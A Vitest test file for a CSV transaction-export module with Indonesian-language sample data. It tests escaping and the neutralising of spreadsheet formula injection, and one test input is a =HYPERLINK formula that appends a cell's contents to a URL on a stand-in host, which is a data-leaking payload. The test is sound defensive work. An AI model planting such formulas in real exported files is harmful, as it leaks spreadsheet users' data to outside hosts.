import { afterEach, describe, expect, it, vi } from 'vitest';
import { exportTransactions, serializeCsvRows } from './export';

vi.mock('xlsx', () => {
	throw new Error('The spreadsheet runtime must not load for CSV exports');
});

afterEach(() => {
	vi.unstubAllGlobals();
});

describe('CSV transaction exports', () => {
	it('escapes commas, quotes, and line breaks', () => {
		expect(
			serializeCsvRows([
				['Keterangan', 'Jumlah'],
				['Kopi, susu', 25_000],
				['Dia bilang "lunas"', 'baris\nbaru']
			])
		).toBe('Keterangan,Jumlah\n"Kopi, susu",25000\n"Dia bilang ""lunas""","baris\nbaru"');
	});

	it('neutralizes text that a spreadsheet would run as a formula', () => {
		expect(
			serializeCsvRows([
				['=HYPERLINK("https://x.test/?"&B2,"Lihat")', '+62812', '-5', '@SUM(A1)', 'Kopi'],
				[-25_000, 0, '\tTab', '\rCR', 'Kas=Bank'],
				['-', '+', 'Diskon - 10%']
			])
		).toBe(
			`"'=HYPERLINK(""https://x.test/?""&B2,""Lihat"")",'+62812,'-5,'@SUM(A1),Kopi\n` +
				`-25000,0,'\tTab,"'\rCR",Kas=Bank\n` +
				`-,+,Diskon - 10%`
		);
	});

	it('downloads CSV without importing the spreadsheet runtime', async () => {
		const click = vi.fn();
		const link = { href: '', download: '', click };
		const appendChild = vi.fn();
		const removeChild = vi.fn();
		const createObjectURL = vi.fn().mockReturnValue('blob:csv-export');
		const revokeObjectURL = vi.fn();
		vi.stubGlobal('document', {
			createElement: vi.fn().mockReturnValue(link),
			body: { appendChild, removeChild }
		});
		vi.stubGlobal('URL', { createObjectURL, revokeObjectURL });

		await exportTransactions([], 'csv', 'transaksi');

		expect(link.download).toBe('transaksi.csv');
		expect(createObjectURL).toHaveBeenCalledOnce();
		expect(click).toHaveBeenCalledOnce();
		expect(appendChild).toHaveBeenCalledWith(link);
		expect(removeChild).toHaveBeenCalledWith(link);
		expect(revokeObjectURL).toHaveBeenCalledWith('blob:csv-export');
	});
});
